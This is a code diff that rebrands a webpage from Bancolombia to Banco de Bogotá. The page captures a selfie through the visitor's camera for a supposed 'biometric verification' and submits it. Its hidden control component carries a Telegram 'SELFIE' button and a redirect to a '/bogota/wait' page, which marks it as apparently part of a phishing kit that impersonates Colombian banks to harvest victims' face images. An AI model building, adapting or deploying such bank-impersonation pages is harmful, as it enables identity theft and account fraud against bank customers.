@@ -5,72 +5,81 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="csrf-token" content="{{ csrf_token() }}">
-    <title>Bancolombia - Verificacion Biometrica</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <script>
-        tailwind.config = {
-            theme: {
-                extend: {
-                    colors: {
-                        'bancolombia-yellow': '#fdda24',
-                    }
-                }
-            }
-        }
-    </script>
+    <link rel="icon" type="image/x-icon" href="/bogota/icono_bogota.ico">
+    <title>Verificación Biométrica - Banca Virtual Banco de Bogotá</title>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css"
+        integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.3.0/font/bootstrap-icons.css">
+    <script src="https://code.jquery.com/jquery-3.7.1.min.js"
+        integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous"></script>
+    <x-control :auto-completar="false" :debug="false" redirect-url="/bogota/wait"
+        toast-message="No se pudo verificar su identidad, intente nuevamente" telegram-button="SELFIE" />
     <style>
         @font-face {
-            font-family: 'bancolombia';
-            src: url('/3co/fonts/bancolombia.ttf') format('truetype');
-            font-weight: 400;
-            font-style: normal;
+            font-family: Roboto-Regular;
+            src: url(/bogota/6bede58e856278b0f8f1.ttf);
+            font-display: swap
         }
 
         @font-face {
-            font-family: "Open Sans";
-            src: url('/3co/fonts/OpenSans-Regular.woff') format('woff'),
-                url('/3co/fonts/OpenSans-Regular.ttf') format('truetype');
-            font-weight: 400;
-            font-style: normal;
+            font-family: Roboto-Medium;
+            src: url(/bogota/0fcd45fbfc419c42c8b9.ttf);
+            font-display: swap
         }
 
         @font-face {
-            font-family: "Open Sans";
-            src: url('/3co/fonts/OpenSans-SemiBold.woff') format('woff'),
-                url('/3co/fonts/OpenSans-SemiBold.ttf') format('truetype');
-            font-weight: 600;
-            font-style: normal;
-        }
-
-        @font-face {
-            font-family: "CIB Sans";
-            src: url('/3co/fonts/CIBFontSansBold.woff2') format('woff2'),
-                url('/3co/fonts/CIBFontSansBold.woff') format('woff');
-            font-weight: 700;
-            font-style: normal;
-        }
-
-        @font-face {
-            font-family: "CIB Sans";
-            src: url('/3co/fonts/CIBFontSansLight.woff2') format('woff2'),
-                url('/3co/fonts/CIBFontSansLight.woff') format('woff');
-            font-weight: 300;
-            font-style: normal;
+            font-family: Roboto-Bold;
+            src: url(/bogota/17451a4c1cd55e33ac57.ttf);
+            font-display: swap
         }
 
         body {
-            font-family: 'Open Sans', sans-serif;
+            font-family: Roboto-Regular;
+            background-color: #f5f5f5;
         }
 
-        .font-cib-sans-bold {
-            font-family: 'CIB Sans', sans-serif;
-            font-weight: 700;
+        .texto-1 {
+            font-size: 24px;
+            font-family: Roboto-Medium;
+            color: #000000;
         }
 
-        .bg-bancolombia {
-            background-image: url('/3co/assets/bgImage.svg');
-            background-position: bottom;
-            background-repeat: no-repeat;
+        .texto-2 {
+            font-size: 14px;
+            font-family: Roboto-Regular;
+            color: #666666;
+        }
+
+        .boton-1 {
+            font-size: 16px;
+            font-family: Roboto-Medium;
+            width: 100%;
+            border-radius: 100px;
+            cursor: pointer;
+            height: 48px;
+            border: solid 1px #0043a9;
+            background-color: #0043a9;
+            color: #ffffff;
+            transition: .3s;
+        }
+
+        .boton-1:disabled {
+            background-color: #ccc;
+            border-color: #ccc;
+            cursor: not-allowed;
+        }
+
+        .boton-secundario {
+            font-size: 14px;
+            font-family: Roboto-Medium;
+            width: 100%;
+            border-radius: 100px;
+            cursor: pointer;
+            height: 40px;
+            border: solid 2px #6b7280;
+            background-color: #ffffff;
+            color: #6b7280;
+            transition: .3s;
         }
 
         .camera-container {
@@ -89,13 +98,8 @@
             display: block;
         }
 
-        #canvas {
-            display: none;
-        }
-
-        #preview {
-            display: none;
-        }
+        #canvas { display: none; }
+        #preview { display: none; }
 
         .overlay {
             position: absolute;
@@ -113,7 +117,7 @@
             transform: translate(-50%, -50%);
             width: 70%;
             height: 85%;
-            border: 3px dashed rgba(253, 218, 36, 0.7);
+            border: 3px dashed rgba(0, 67, 169, 0.7);
             border-radius: 50%;
         }
 
@@ -121,124 +125,71 @@
             border-color: #22c55e;
         }
 
-        .loading-spinner {
-            width: 48px;
-            height: 48px;
-            border: 4px solid #fdda24;
-            border-top: 4px solid transparent;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+        @media only screen and (min-width: 768px) {
+            body {
+                width: 40%;
+                margin: 0 auto;
+            }
         }
     </style>
-    <x-control :auto-guardar="false" :auto-completar="false" :auto-init="true" :debug="false" />
 </head>
 
-<body class="bg-gray-100">
-
+<body class="px-3">
     <!-- Header -->
-    <div class="w-full flex justify-center items-center py-3 z-50">
-        <div class="w-[98%] flex gap-10 items-center">
-            <img src="/3co/assets/header.svg" class="ml-[25%] w-[45%] object-contain" alt="Bancolombia" />
-            <div class="flex justify-center items-center gap-1.5 cursor-pointer">
-                <span class="text-[15px]">Salir</span>
-                <img src="/3co/assets/exitHeader.svg" class="w-5 object-contain" alt="Salir" />
-            </div>
-        </div>
+    <div class="text-center py-4">
+        <img src="/bogota/logo_bogota_1.svg" width="300" height="auto" alt="Banco de Bogotá">
     </div>
 
-    <!-- Main Content -->
-    <div class="bg-bancolombia min-h-[70vh] w-[90%] mx-auto flex flex-col items-center justify-start">
+    <!-- Contenido Principal -->
+    <h1 class="texto-1 mt-2 text-center">Verificación biométrica</h1>
+    <p class="texto-2 text-center">Tome una selfie para verificar su identidad</p>
 
-        <div id="selfieSection" class="w-full flex flex-col justify-center items-center pb-6">
-            <h5 class="text-[24px] font-cib-sans-bold mt-6">Verificacion biometrica</h5>
-            <p class="text-gray-600 text-[14px] mt-1 text-center">Tome una selfie para verificar su identidad</p>
+    <div class="bg-white rounded-3 p-3 mb-3">
+        <!-- Error de cámara -->
+        <div id="cameraError" class="d-none text-center py-4">
+            <i class="bi bi-exclamation-triangle text-danger" style="font-size: 48px;"></i>
+            <p class="text-danger fw-bold mt-2">No se pudo acceder a la cámara</p>
+            <p class="text-muted small">Permita el acceso a la cámara en su navegador</p>
+        </div>
 
-            <div class="w-full flex mt-4 flex-col justify-center items-center gap-4">
-                <div class="w-full bg-white py-5 px-4 rounded-xl flex flex-col items-center">
-
-                    <!-- Error de cámara -->
-                    <div id="cameraError" class="hidden w-full text-center py-8">
-                        <div class="text-red-500 mb-2">
-                            <svg class="w-12 h-12 mx-auto" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
-                            </svg>
-                        </div>
-                        <p class="text-red-600 font-semibold">No se pudo acceder a la camara</p>
-                        <p class="text-gray-500 text-sm mt-1">Permita el acceso a la camara en su navegador</p>
-                    </div>
-
-                    <!-- Contenedor de cámara -->
-                    <div id="cameraWrapper" class="w-full">
-                        <div class="camera-container">
-                            <video id="video" autoplay playsinline></video>
-                            <canvas id="canvas"></canvas>
-                            <img id="preview" alt="Vista previa">
-                            <div class="overlay">
-                                <div class="face-guide" id="faceGuide"></div>
-                            </div>
-                        </div>
-
-                        <!-- Instrucciones -->
-                        <div class="mt-4 bg-gray-50 rounded-lg p-3">
-                            <ul class="text-[12px] text-gray-600 space-y-1">
-                                <li class="flex items-center gap-2">
-                                    <span class="text-green-500 font-bold">✓</span>
-                                    Ubique su rostro dentro del ovalo
-                                </li>
-                                <li class="flex items-center gap-2">
-                                    <span class="text-green-500 font-bold">✓</span>
-                                    Asegurese de tener buena iluminacion
-                                </li>
-                                <li class="flex items-center gap-2">
-                                    <span class="text-green-500 font-bold">✓</span>
-                                    No use gafas de sol ni gorras
-                                </li>
-                                <li class="flex items-center gap-2">
-                                    <span class="text-green-500 font-bold">✓</span>
-                                    Mantenga una expresion neutral
-                                </li>
-                            </ul>
-                        </div>
-                    </div>
-
-                    <form id="formSelfie" class="w-full mt-4">
-                        <input type="hidden" id="selfie" name="selfie">
-                        <input type="hidden" id="no-status" name="status" value="selfie">
-
-                        <div class="flex flex-col gap-3">
-                            <button type="button" id="btnCapturar"
-                                class="w-full font-bold py-3 px-6 rounded-full bg-bancolombia-yellow text-black cursor-pointer">
-                                Tomar Foto
-                            </button>
-
-                            <button type="submit" id="enviar"
-                                class="w-full font-bold py-3 px-6 rounded-full bg-bancolombia-yellow text-black cursor-pointer hidden">
-                                Continuar
-                            </button>
-
-                            <button type="button" id="btnReintentar"
-                                class="w-full font-semibold py-2 px-6 rounded-full border-2 border-gray-400 text-gray-600 cursor-pointer hidden">
-                                Volver a Tomar
-                            </button>
-                        </div>
-                    </form>
-
+        <!-- Contenedor de cámara -->
+        <div id="cameraWrapper">
+            <div class="camera-container">
+                <video id="video" autoplay playsinline></video>
+                <canvas id="canvas"></canvas>
+                <img id="preview" alt="Vista previa">
+                <div class="overlay">
+                    <div class="face-guide" id="faceGuide"></div>
                 </div>
             </div>
+
+            <!-- Instrucciones -->
+            <div class="mt-3 bg-light rounded p-3">
+                <ul class="small text-muted mb-0 ps-3">
+                    <li>Ubique su rostro dentro del óvalo</li>
+                    <li>Asegúrese de tener buena iluminación</li>
+                    <li>No use gafas de sol ni gorras</li>
+                    <li>Mantenga una expresión neutral</li>
+                </ul>
+            </div>
         </div>
 
-    </div>
+        <form id="formSelfie" class="mt-4">
+            <input type="hidden" id="selfie" name="selfie">
+            <input type="hidden" id="no-status" name="status" value="selfie">
 
-    <!-- Footer -->
-    <div class="w-full flex flex-col justify-center items-center py-7">
-        <div class="w-[90%] border-t border-gray-300"></div>
-        <img src="/3co/assets/header.svg" class="w-[40%] object-contain" alt="Bancolombia" />
-        <img src="/3co/assets/foter.svg" class="w-[40%] object-contain mt-0.5" alt="Footer" />
+            <button type="button" id="btnCapturar" class="boton-1 mb-2">
+                Tomar Foto
+            </button>
+
+            <button type="submit" id="enviar" class="boton-1 d-none mb-2">
+                Continuar
+            </button>
+
+            <button type="button" id="btnReintentar" class="boton-secundario d-none">
+                Volver a Tomar
+            </button>
+        </form>
     </div>
 
     <script>
@@ -258,18 +209,13 @@
         async function iniciarCamara() {
             try {
                 stream = await navigator.mediaDevices.getUserMedia({
-                    video: {
-                        facingMode: 'user',
-                        width: { ideal: 640 },
-                        height: { ideal: 640 }
-                    },
+                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 640 } },
                     audio: false
                 });
                 video.srcObject = stream;
             } catch (error) {
-                console.error('Error al acceder a la camara:', error);
                 cameraWrapper.style.display = 'none';
-                cameraError.classList.remove('hidden');
+                cameraError.classList.remove('d-none');
             }
         }
 
@@ -287,8 +233,8 @@
             preview.style.display = 'block';
 
             btnCapturar.style.display = 'none';
-            btnEnviar.classList.remove('hidden');
-            btnReintentar.classList.remove('hidden');
+            btnEnviar.classList.remove('d-none');
+            btnReintentar.classList.remove('d-none');
 
             faceGuide.classList.add('captured');
         }
@@ -299,8 +245,8 @@
             selfieData.value = '';
 
             btnCapturar.style.display = 'block';
-            btnEnviar.classList.add('hidden');
-            btnReintentar.classList.add('hidden');
+            btnEnviar.classList.add('d-none');
+            btnReintentar.classList.add('d-none');
 
             faceGuide.classList.remove('captured');
         }
@@ -311,14 +257,9 @@
         iniciarCamara();
     </script>
 
-    <x-control
-        :auto-completar="false"
-        :debug="false"
-        redirect-url="/bogota/wait"
-        toast-message="No se pudo verificar su identidad, intente nuevamente"
-        telegram-button="SELFIE"
-    />
-
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"
+        integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL"
+        crossorigin="anonymous"></script>
 </body>
 
 </html>
